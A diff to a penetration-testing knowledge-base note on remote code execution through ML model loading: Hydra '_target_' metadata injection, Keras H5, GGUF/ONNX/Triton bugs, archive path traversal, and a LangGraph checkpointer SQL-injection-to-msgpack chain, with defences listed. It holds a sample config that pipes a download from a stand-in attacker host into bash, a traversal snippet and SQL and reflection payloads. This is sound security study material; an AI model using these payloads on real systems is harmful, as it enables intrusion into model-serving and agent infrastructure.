@@ -4,8 +4,8 @@ type: technique
 tags: [machine-learning, deserialization, rce, pickle, keras, pytorch, huggingface, supply-chain, ai]
 phase: exploitation
 date_created: 2026-07-02
-date_updated: 2026-07-02
-sources: [hiddenlayer-models-are-code, huntr-keras-deserialization, cve-2025-32434, cve-2025-1550]
+date_updated: 2026-07-14
+sources: [hiddenlayer-models-are-code, huntr-keras-deserialization, cve-2025-32434, cve-2025-1550, hacktricks-ai]
 ---
 
 # ML Model Deserialization RCE (Models Are Code)
@@ -134,10 +134,69 @@ for name in dir(mod):
 - `safetensors` and `onnx`: safe serialization targets.
 - `torch`, `tensorflow`, `keras`: the frameworks whose load paths are under test; check versions with `pip show`.
 
+## Metadata and format-driven model RCE beyond pickle
+
+Beyond the pickle family, code execution fires even when the artifact is a "safe" non-pickle format, plus parser and archive bugs. Treat any model load as untrusted-input parsing, not just unpickling.
+
+Hydra `_target_` metadata injection is the headline: libraries that feed untrusted model metadata or config into `hydra.utils.instantiate()` will import and call any dotted callable, so RCE happens with no pickle at all. This works inside a `.nemo` `model_config.yaml`, a HuggingFace repo `config.json`, or the `__metadata__` block of a `.safetensors` file (CVE-2025-23304, FlexTok, uni2TS).
+
+```yaml
+# Malicious metadata/config; executed during model load, even for safetensors
+_target_: builtins.exec
+_args_:
+  - "import os; os.system('curl http://ATTACKER/x|bash')"
+```
+
+Hydra keeps a string block-list, but it is bypassable through alternate import paths (for example `enum.bltns.eval`) or application-resolved names that resolve to `os.system`. Trigger points seen in the wild: NeMo `restore_from` and `from_pretrained`, uni2TS HuggingFace coders, FlexTok loaders (FlexTok also runs `ast.literal_eval` on stringified metadata, giving a CPU/memory DoS before the Hydra call).
+
+Other non-pickle format paths worth testing on any target that loads attacker-supplied models:
+
+- Keras legacy H5 downgrade: a `.h5` model with a Lambda layer still executes on load because `safe_mode` does not cover the old format, so a modern app that refuses `.keras` may still eat an `.h5`.
+- TensorFlow YAML load (`CVE-2021-37678`) uses `yaml.unsafe_load`, giving code execution from a crafted model YAML.
+- GGML / GGUF parser heap overflows (`CVE-2024-25664` and neighbors): a malformed `.gguf` corrupts the heap in llama.cpp-style loaders and can reach RCE.
+- ONNX external-weights and tar handling (`CVE-2022-25882`, `CVE-2024-5187`): directory or tar traversal lets a model read arbitrary files or overwrite files on extract. ONNX custom ops require loading attacker native code.
+- NVIDIA Triton model-control API path traversal (`CVE-2023-31036`) writes files outside the model dir (for example overwrite a startup script) for RCE.
+
+Model archive path traversal (zip-slip) applies broadly because most model formats are zip or tar archives. A crafted member name or symlink escapes the extraction directory on load:
+
+```python
+import tarfile
+def escape(member):
+    member.name = "../../tmp/hacked"   # break out of the extract dir
+    return member
+with tarfile.open("traversal_demo.model", "w:gz") as tf:
+    tf.add("harmless.txt", filter=escape)
+```
+
+Methodology: fingerprint the loader library and version, prefer a non-pickle format if the app claims "safe" loading, then test Hydra `_target_`, Keras Lambda H5, and archive traversal before concluding the model channel is inert. Defence stays the same: signed/allow-listed model sources, `weights_only=True`, sandboxed deserialization (non-root, no network egress), and never call `instantiate()` on untrusted config.
+
+## AI agent-framework deserialization chains (persistence and checkpointer sinks)
+
+A distinct class from malicious model files: the app exposes an agent persistence or memory API and user input reaches a query builder or a custom deserializer, so no model upload is needed. The LangGraph checkpointer chain is the reference case and generalizes to any agent framework with state history, replay, or checkpoint-listing endpoints.
+
+Chain, from user input to RCE:
+
+1. Structural SQLi in a metadata filter. A dict key is concatenated into a JSON path string (`json_extract(..., '$.{query_key}')`), so a quote in the key breaks out and injects SQL. Bound parameters protect values only, never identifiers, JSON paths, operators, `LIMIT`, or TTL fields.
+2. `UNION SELECT` fabricates a fake result row whose serialized-checkpoint column is attacker-controlled, because the returned `type` and `checkpoint` bytes are later fed to `serde.loads_typed((type, checkpoint))`.
+
+```sql
+UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
+```
+
+3. An unsafe MessagePack extension hook then imports and calls arbitrary code:
+
+```python
+# The custom msgpack reviver executes, equivalent to os.system("id > /tmp/pwned")
+getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
+```
+
+Audit pattern for any agent stack: trace user-controlled input that reaches state history / memory / replay / checkpoint APIs, structured filter builders that generate SQL or Redis fragments, and custom revivers (`pickle`, `msgpack`, JSON object hooks, YAML constructors) that do dynamic import, reflection, or callable dispatch. Also review recovery paths that trust rows returned from the persistence layer. Affected LangGraph SQLite/Redis checkpointers were patched in `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, `langgraph-checkpoint 4.0.1+`.
+
 ## Sources
 
 - HiddenLayer, "Models Are Code" (Innovation Hub): pickle `__reduce__`, Keras Lambda marshal, TensorFlow SavedModel graph ops.
 - huntr blog, "Hunting Vulnerabilities in Keras Model Deserialization": `.keras` config attack surface, CVE-2024-3660 Lambda, CVE-2025-1550 module-import bypass, `safe_mode` allowlist and residual gadgets.
 - CVE-2025-32434: `torch.load` RCE bypassing `weights_only=True`, fixed in PyTorch 2.6.0.
 - CVE-2025-1550: Keras <= 3.8.0 arbitrary module import via `config.json` deserialization.
-- Related: [[insecure-deserialization]], [[supply-chain-attacks]], [[llm-attacks]].
+- HackTricks (AI): non-pickle/metadata model RCE (Hydra `_target_`, CVE-2025-23304, GGUF/ONNX/Triton, zip-slip) and agent-framework deserialization chains (LangGraph checkpointer SQLi to msgpack RCE).
+- Related: [[insecure-deserialization]], [[supply-chain-attacks]], [[llm-attacks]], [[adversarial-ml]].
